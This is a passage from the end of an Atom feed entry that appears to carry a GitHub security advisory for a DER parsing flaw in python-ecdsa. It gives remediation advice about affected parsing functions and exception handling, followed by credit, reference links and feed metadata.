<li><code>remove_octet_string()</code></li>
<li><code>remove_constructed()</code></li>
<li><code>remove_implicit()</code></li>
</ul>
<p>Additionally, consider catching unexpected internal exceptions in DER key parsing paths and re-raising them as <code>UnexpectedDER</code> to avoid crashy failure modes.</p>
<h2 id="credit">Credit</h2>
<p>Mohamed Abdelaal (@0xmrma)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-9f5j-8jwj-x28g">https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-9f5j-8jwj-x28g</a></li>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/commit/bd66899550d7185939bf27b75713a2ac9325a9d3">https://github.com/tlsfuzzer/python-ecdsa/commit/bd66899550d7185939bf27b75713a2ac9325a9d3</a></li>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/releases/tag/python-ecdsa-0.19.2">https://github.com/tlsfuzzer/python-ecdsa/releases/tag/python-ecdsa-0.19.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33936">https://nvd.nist.gov/vuln/detail/CVE-2026-33936</a></li>
<li><a href="https://github.com/advisories/GHSA-9f5j-8jwj-x28g">https://github.com/advisories/GHSA-9f5j-8jwj-x28g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9f5j-8jwj-x28g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T15:56:01.000Z</published>
    </entry>
</feed>